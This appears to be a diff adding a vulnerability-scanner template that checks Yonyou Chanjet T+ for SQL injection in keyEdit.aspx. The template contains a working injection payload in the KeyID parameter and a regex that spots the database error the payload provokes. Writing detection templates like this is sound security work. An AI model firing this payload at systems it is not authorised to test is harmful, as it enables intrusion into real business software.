@@ -1,0 +1,25 @@
+id: JieRuiTong-keyEdit-sql
+
+info:
+  name: 用友 畅捷通T+ keyEdit.aspx 存在SQL注入
+  author: proud
+  severity: high
+  description: description
+  tags: SQL yongyou
+
+http:
+  - raw:
+      - |+
+        GET /tplus/UFAQD/keyEdit.aspx?KeyID=222%27%20and%201=(select%20@@version)%20--&preload=1 HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - '转换成数据类型\s+int\s+时失败'  # \s+匹配1个以上空白字符
+      - type: status
+        status:
+          - 200
